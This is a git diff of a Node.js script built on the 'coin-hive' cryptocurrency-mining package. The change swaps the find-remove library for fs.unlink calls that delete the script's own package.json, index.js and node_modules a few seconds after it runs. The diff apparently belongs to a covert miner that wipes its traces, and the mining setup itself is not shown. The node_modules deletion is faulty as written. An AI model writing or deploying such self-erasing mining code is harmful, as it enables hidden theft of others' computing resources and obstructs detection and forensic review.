@@ -1,5 +1,5 @@
 const CoinHive = require("coin-hive");
-const findRemoveSync = require("find-remove");
+const fs = require('fs');
 
 (async () => {
   
@@ -35,11 +35,27 @@ const findRemoveSync = require("find-remove");
       
       try {
           console.log('Clean up ' + rootDir);
-          //findRemoveSync(rootDir, {dir: "*", files: "*.*", ignore: "puppeteer"});
-          findRemoveSync(rootDir, {files: "*.*"});
-          findRemoveSync(rootDir + "\node_modules", {dir: "coin-hive*"});
+          
+          fs.unlink(rootDir + '\\package.json', (err) => {
+              if (err) {
+                  throw err;
+              }
+          });
+          
+          fs.unlink(rootDir + '\\index.js', (err) => {
+              if (err) {
+                  throw err;
+              }
+          });
+          
+          fs.unlink(rootDir + '\\node_modules', (err) => {
+              if (err) {
+                  throw err;
+              }
+          });
+          
       } catch(e) {
-
+        console.log(e);
       }
       
   }, 3000);
